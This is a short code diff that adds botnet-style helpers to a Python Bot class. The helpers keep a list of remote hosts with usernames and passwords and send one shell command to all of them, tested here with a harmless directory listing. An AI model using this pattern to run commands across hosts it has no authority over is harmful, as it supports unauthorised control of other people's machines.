@@ -21,3 +21,17 @@ class Bot:
         return self.session.before
 
 
+botnets = []
+def add_bot(host, uname, pswd):
+    botnets.append(Bot(host, uname, pswd))
+
+def execute_cmd(cmd):
+    for bot in botnets:
+        send = bot.send_cmd(cmd)
+        print('[+] Bot: ' + bot.uname + '@' + bot.host + '~ ' + send)
+
+# Testing ...
+add_bot('', '', '')
+execute_cmd('ls -1alh')
+
+
